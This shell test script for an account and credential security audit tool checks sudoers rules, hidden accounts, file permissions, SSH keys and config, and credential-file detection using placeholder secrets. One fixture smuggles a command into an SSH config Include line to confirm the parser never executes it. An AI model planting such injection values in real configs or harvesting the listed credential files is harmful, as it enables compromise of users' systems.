check "G7 Runas list with a comma" has "$T/g7.out" $'MA-ACCOUNTS-009\tHIGH\tw ALL'
check "G7 digest spec before a shell" has "$T/g7.out" $'MA-ACCOUNTS-009\tHIGH\tu1 ALL'
check "G7 option spec before a shell" has "$T/g7.out" $'MA-ACCOUNTS-009\tHIGH\tu2 ALL'
check "G7 digest and option specs before a program list it" has "$T/g7.out" $'MA-ACCOUNTS-006\tLOW\tu3 ALL = (root) NOPASSWD: SHA512:0a1b2c3d4e5f TIMEOUT=5 /usr/bin/ssh-keygen\t/usr/bin/ssh-keygen'
check "G7 full rule text kept" has "$T/g7.out" "b ALL = (root) NOPASSWD: /usr/bin/python3"
# G14: hidden accounts.
printf '%s\n' 'hadmin 502 yes' 'huser 503 no' '_sys 200 no' | hidden_findings > "$T/g14"
check "G14 hidden admin is MEDIUM" has "$T/g14" $'MA-ACCOUNTS-013\tMEDIUM\thadmin'
check "G14 hidden user is LOW" has "$T/g14" $'MA-ACCOUNTS-014\tLOW\thuser'
check "G14 system account ignored" hasnt "$T/g14" "_sys"
# G20: home folders.
( group_has_others() { [ "$1" = 20 ]; }
  [ -n "$(home_write_risk drwxrwxr-x 20 alice)" ] && [ -z "$(home_write_risk drwxrwxr-x 99 alice)" ] &&
  [ -n "$(home_write_risk drwxr-xrwx 99 alice)" ] && [ -z "$(home_write_risk drwxr-xr-x 20 alice)" ] )
check "G20 home folder writable by staff or everyone, not by a group without other members" [ $? -eq 0 ]
# G22: sudo file owner and mode.
check "G22 stock sudoers" [ -z "$(sudo_owner_risk /etc/sudoers 'root:wheel -r--r-----')" ]
check "G22 other owner" [ -n "$(sudo_owner_risk /etc/sudoers 'bob:wheel -r--r-----')" ]
check "G22 group-writable folder" [ -n "$(sudo_owner_risk /etc/sudoers.d 'root:wheel drwxrwxr-x')" ]
check "G22 sudo without setuid" [ -n "$(sudo_owner_risk /usr/bin/sudo 'root:wheel -r-x--x--x')" ]
check "G22 stock sudo" [ -z "$(sudo_owner_risk /usr/bin/sudo 'root:wheel -r-s--x--x')" ]

# G3: credential files. Presence, mode and inline-secret state only.
cred_home() { mkdir -p "$1/.aws" "$1/.docker" "$1/.kube" "$1/.config/gh"; }
H1="$T/h1"; cred_home "$H1"
printf 'machine x login u password SECRET_A\n' > "$H1/.netrc"
printf '[prof_SECRET]\naws_access_key_id = AKIDEXAMPLE\naws_secret_access_key = SECRET_B\n' > "$H1/.aws/credentials"
printf 'https://u:SECRET_C@github.com\n' > "$H1/.git-credentials"
printf '//registry.npmjs.org/:_authToken=SECRET_D\n' > "$H1/.npmrc"
printf '[pypi]\nusername = u\npassword = SECRET_E\n' > "$H1/.pypirc"
printf '{"auths":{"r":{"auth":"SECRET_F"}}}\n' > "$H1/.docker/config.json"
printf 'users:\n- name: x\n  user:\n    token: SECRET_G\n' > "$H1/.kube/config.real"; ln -s config.real "$H1/.kube/config"
printf 'github.com:\n    oauth_token: SECRET_H\n' > "$H1/.config/gh/hosts.yml"
chmod 644 "$H1/.netrc"
H2="$T/h2"; cred_home "$H2"
printf 'machine x login u\n' > "$H2/.netrc"
printf '[default]\naws_access_key_id = AKIDEXAMPLE\n' > "$H2/.aws/credentials"
: > "$H2/.git-credentials"
printf '//registry.npmjs.org/:_authToken=${NPM_TOKEN}\n' > "$H2/.npmrc"
printf '[pypi]\nusername = u\n' > "$H2/.pypirc"
printf '{"credsStore":"osxkeychain"}\n' > "$H2/.docker/config.json"
printf 'users:\n- name: x\n  user:\n    exec: {}\n' > "$H2/.kube/config"
printf 'github.com:\n    user: u\n' > "$H2/.config/gh/hosts.yml"
cred_scan "$H1" > "$T/g3a"; cred_scan "$H2" > "$T/g3b"
check "G3 no secret value or profile name" [ -z "$(cat "$T/g3a" "$T/g3b" | grep -E 'SECRET|AKID|prof_')" ]
check "G3 eight files with an inline secret" [ "$(awk -F'\t' '$3 == "yes"' "$T/g3a" | grep -c .)" -eq 8 ]
check "G3 eight files without one" [ "$(awk -F'\t' '$3 == "no"' "$T/g3b" | grep -c .)" -eq 8 ]
check "G3 mode shown" has "$T/g3a" $'.netrc\t-rw-r--r--'
check "G3 symlinked file reports the target mode" [ "$(awk -F'\t' '$1 == ".kube/config" {print substr($2, 1, 10)}' "$T/g3a")" = "-rw-------" ]
# G4: SSH private keys from headers only.
K="$T/keys"; mkdir "$K"
ssh-keygen -q -t ed25519 -N '' -C SECRET_C1 -f "$K/plain"
ssh-keygen -q -t ed25519 -N 'test-passphrase' -f "$K/locked"
ssh-keygen -q -t rsa -b 2048 -m PEM -N '' -f "$K/pem_plain"
ssh-keygen -q -t rsa -b 2048 -m PEM -N 'test-passphrase' -f "$K/pem_locked"
ssh-keygen -q -t rsa -b 2048 -m PKCS8 -N 'test-passphrase' -f "$K/p8"
{ head -1 "$K/plain"; sed '1d;$d' "$K/plain" | tr -d '\n'; echo; tail -1 "$K/plain"; } > "$K/oneline"
cp "$K/plain" "$K/x.pub"; echo "not a key" > "$K/notes"
check "G4 OpenSSH none" [ "$(ssh_key_state "$K/plain")" = "no passphrase" ]
check "G4 OpenSSH with a passphrase" [ "$(ssh_key_state "$K/locked")" = passphrase ]
check "G4 PEM without ENCRYPTED" [ "$(ssh_key_state "$K/pem_plain")" = "no passphrase" ]
check "G4 PEM with ENCRYPTED" [ "$(ssh_key_state "$K/pem_locked")" = passphrase ]
check "G4 PKCS#8 encrypted" [ "$(ssh_key_state "$K/p8")" = passphrase ]
check "G4 one-line OpenSSH key" [ "$(ssh_key_state "$K/oneline")" = "no passphrase" ]
check "G4 not a key" [ -z "$(ssh_key_state "$K/notes")" ]
check "G4 private key named .pub is a private key" [ "$(ssh_key_state "$K/x.pub")" = "no passphrase" ]
printf -- '-----BEGIN OPENSSH PRIVATE KEY-----\r\nDUMMYBODYTEXT\r\n-----END OPENSSH PRIVATE KEY-----\r\n' > "$K/crlf.pub"
check "G4 CRLF private key named .pub is a private key" [ -n "$(ssh_key_state "$K/crlf.pub")" ]
check "G4 private-key function never runs ssh-keygen" [ -z "$(type ssh_key_state | grep ssh-keygen)" ]
check "G4 public summary has no comment" [ -z "$(ssh_pub_summary "$K/plain.pub" | grep SECRET)" ]
check "G4 public summary bits and type" [ "$(ssh_pub_summary "$K/plain.pub" | cut -f2,3)" = $'256\t(ED25519)' ]
# G5, G18: SSH client options, Include handling, and loops.
S="$T/ssh"; mkdir -p "$S/home/.ssh" "$S/inc"
cat > "$S/home/.ssh/config" <<EOF
ForwardAgent yes
Include $S/inc/*.conf
Include \$(touch $T/pwned)
Include ~/.ssh/config
Host secret-host.example
  StrictHostKeyChecking=no
Host *
  StrictHostKeyChecking off
EOF
printf 'Host other.example\n  ForwardAgent yes\n' > "$S/inc/a.conf"
( THOME="$S/home"; SSH_SEEN=""; ssh_cfg "$S/home/.ssh/config" 1 all ) > "$T/g5"
check "G5 option before the first Host applies to every host" has "$T/g5" "all ForwardAgent"
check "G5 Include outside ~/.ssh under a named host" has "$T/g5" "host ForwardAgent"
check "G5 Key=value under a named host" has "$T/g5" "host StrictHostKeyChecking"
check "G5 off under Host *" has "$T/g5" "all StrictHostKeyChecking"
check "G5 host names not in the output" hasnt "$T/g5" "example"
check "G18 self-include read once" [ "$(grep -c 'all ForwardAgent' "$T/g5")" -eq 1 ]
check "G18 Include text is never run" [ ! -e "$T/pwned" ]

# G6: git hooksPath; other sections, such as a [url] with a token, never print.
printf '[core]\n\thooksPath = ~/.githooks\n[url "https://SECRET_T@github.com/"]\n\tinsteadOf = https://github.com/\n' > "$T/gitconfig"
check "G6 hooksPath found" [ "$(git_hooks_path "$T/gitconfig")" = "~/.githooks" ]
check "G6 url token not printed" [ -z "$(git_hooks_path "$T/gitconfig" | grep SECRET)" ]

echo ""
if [ "$FAILS" -eq 0 ]; then echo "All cases passed."; else echo "$FAILS case(s) failed."; exit 1; fi
